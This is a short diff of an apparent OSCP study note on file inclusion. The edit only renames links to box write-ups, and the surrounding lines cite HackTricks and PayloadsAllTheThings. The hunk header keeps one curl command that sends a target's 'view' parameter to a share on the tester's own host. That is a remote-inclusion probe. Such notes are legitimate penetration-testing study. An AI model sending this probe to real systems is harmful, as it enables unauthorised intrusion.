@@ -96,8 +96,8 @@ curl -s "http://$BoxIP/index.php?view=\\/$LocalIP/share/probe"
 | HackTricks — LFI | https://book.hacktricks.xyz/pentesting-web/file-inclusion |
 | PayloadsAllTheThings — LFI | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion |
 ## Seen in
-- [[OSCP/BOXES/WRITE UPS/Linux/3. Payday|Payday]] -- confirmed in the box write-up
-- [[OSCP/BOXES/WRITE UPS/Linux/4. Snookums|Snookums]] -- confirmed in the box write-up
+- [[OSCP/BOXES/WRITE UPS/Linux/Payday|Payday]] -- confirmed in the box write-up
+- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- confirmed in the box write-up
 
 ## Related stages
